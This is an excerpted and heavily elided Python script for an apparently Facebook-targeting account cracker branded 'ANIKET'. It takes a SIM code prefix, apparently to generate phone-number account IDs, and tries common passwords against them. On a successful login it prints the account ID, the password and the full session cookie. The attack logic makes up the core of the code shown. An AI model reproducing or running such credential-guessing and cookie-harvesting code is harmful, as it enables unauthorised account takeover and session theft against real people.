...
--------------------------------------------------
[•] AUTHOR     : \033[1;32mANIKET\033[1;37m
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://https://www.facebook.com/anam.ansari.56829446')
	elif gh =='0':
...
def menu():
	...
	print('[2] ANI + RAM PASS')
	print('[3] ANIKET + SHARMA PASS')
...
def ali_khan():
	...
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE :91887,91345,91323,91306.ETC')
	lines()
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
...
def chos():
    ...
    os.system('clear')
    print(logo)
    print('[•] EXAMPLE : anii12345,india,sharma,Etc')
    lines()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ANIKET-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[ANIKET-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mANIKET\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
